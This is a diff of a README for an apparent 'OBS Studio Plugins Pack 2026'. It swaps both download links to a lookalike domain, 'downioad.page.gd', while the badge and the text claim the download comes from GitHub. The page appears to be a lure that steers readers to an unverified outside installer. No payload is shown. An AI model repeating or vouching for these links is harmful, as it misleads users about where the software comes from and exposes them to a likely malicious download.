@@ -2,7 +2,7 @@
 
 OBS Studio Plugins Pack 2026 is a comprehensive collection of tools and plugins designed to elevate your streaming and recording capabilities. This package offers a curated set of features optimized for professional use in 2026, ensuring seamless integration with OBS Studio on Windows desktop systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -56,7 +56,7 @@ You can uninstall via the Windows Control Panel under "Programs and Features" or
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## License
 
